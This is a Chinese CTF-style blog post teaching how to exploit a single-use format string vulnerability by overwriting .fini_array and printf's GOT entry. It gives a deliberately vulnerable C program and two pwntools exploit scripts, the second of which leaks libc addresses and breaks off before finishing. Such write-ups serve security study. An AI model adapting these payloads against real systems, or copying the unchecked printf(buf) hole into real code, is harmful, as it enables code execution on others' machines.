只有一次的格式化字符串漏洞

发表于2022-08-06|更新于2022-08-02
|阅读量:

首先我们要知道linux下一个程序是怎样进入main函数的。

具体流程参考链接：https://luomuxiaoxiao.com/?p=516

如果我们能吧_fini_arry中的值更改为main函数，那么我们就可以在一次执行main函数

例题参考国资师傅

#include 
#include 
#include 

int sys(char *cmd){
    system(cmd);
}

int init_func(){
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    return 0;
}

int dofunc(){
    char buf[0x100] ;
        puts("input:");
        read(0,buf,0x100);
        printf(buf);      
    return 0;
}

int main(){
    init_func();
    dofunc();
    return 0;
}
//gcc fmt_str_once_sys.c -no-pie -z norelro -o fmt_str_once_sys_x64
//gcc -m32 fmt_str_once_sys.c  -no-pie -z norelro -o fmt_str_once_x86

exp

#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.log_level='debug'
context.arch = 'amd64'

p = process('./fmt_str_once_sys_x64')

elf = ELF('./fmt_str_once_sys_x64')
libc =elf.libc

p.recvuntil('input:\n')
fini_array = 0x0600A58
main_adrr = elf.symbols["main"]
printf_got = elf.got["printf"]
system_plt = 0x04006F7

payload = fmtstr_payload(6, {printf_got:system_plt,fini_array :main_adrr})
print(payload)
p.send(payload)

p.interactive()

exp

from pwn import*
context.log_level='debug'
context.arch='amd64'
p=process('./fmt_str_once_no_sys_x64')
elf=ELF('./fmt_str_once_no_sys_x64')
libc=elf.libc
main=elf.sym['main']
printf_got=elf.sym['main']

fini_array=0x06009D0
p.recvuntil('input:\n')

payload=b"%40$p%43$p"
align_len = 16
len_a = align_len - len(payload)
payload = payload.ljust(align_len,b"a")
numb_written = 14 + 14 + len_a
payload+=fmtstr_payload(8,{fini_array:main},numbwritten = numb_written)
p.sendline(payload)


stack=int(p.recv(14),16)
libc_base=int(p.recv(14),16)-231-libc.sym['__libc_start_main']
stack1=stack-0x100
system=libc_base+libc.sym['system']
one_gadget=libc_base+0x4f2a5
